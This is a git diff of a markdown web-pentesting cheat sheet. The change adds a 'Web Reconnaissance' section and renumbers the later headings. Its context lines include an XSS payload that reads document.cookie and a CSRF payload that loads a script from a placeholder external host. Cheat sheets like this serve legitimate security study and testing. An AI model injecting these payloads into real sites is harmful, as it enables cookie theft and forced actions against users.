@@ -6,11 +6,12 @@ Overview
 2. - [Web Proxies](#2---web-proxies)
 3. - [Online Resources](#3---online-resources)
 4. - [Browser Plugins](#4---browser-plugins)
-5. - [Sensitive Data Exposure](#5---sensitive-data-exposure)
-6. - [HTML Injection](#6---html-injection)
-7. - [Cross-Site Scripting (XSS)](#7---cross-site-scripting-xss)
-8. - [Cross-Site Request Forgery (CSRF)](#8---cross-site-request-forgery-csrf)
-9. - [Exploit Research](#9---exploit-research)
+5. - [Web Reconnaissance](#5---web-reconnaissance)
+6. - [Sensitive Data Exposure](#6---sensitive-data-exposure)
+7. - [HTML Injection](#7---html-injection)
+8. - [Cross-Site Scripting (XSS)](#8---cross-site-scripting-xss)
+9. - [Cross-Site Request Forgery (CSRF)](#9---cross-site-request-forgery-csrf)
+10. - [Exploit Research](#10---exploit-research)
 
    
 #1. - Web Requests
@@ -111,7 +112,10 @@ https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
 https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
 
-#5. - Sensitive Data Exposure
+#5. - Web Reconnaissance
+-----------------------------------------
+
+#6. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -122,7 +126,7 @@ OR
 CTRL + U
 ```
 
-#6. - HTML Injection
+#7. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -131,7 +135,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#7. - Cross-Site Scripting (XSS)
+#8. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*
@@ -146,7 +150,7 @@ CTRL + U
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
-#8. - Cross-Site Request Forgery (CSRF)
+#9. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -155,7 +159,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#9. - Exploit Research
+#10. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
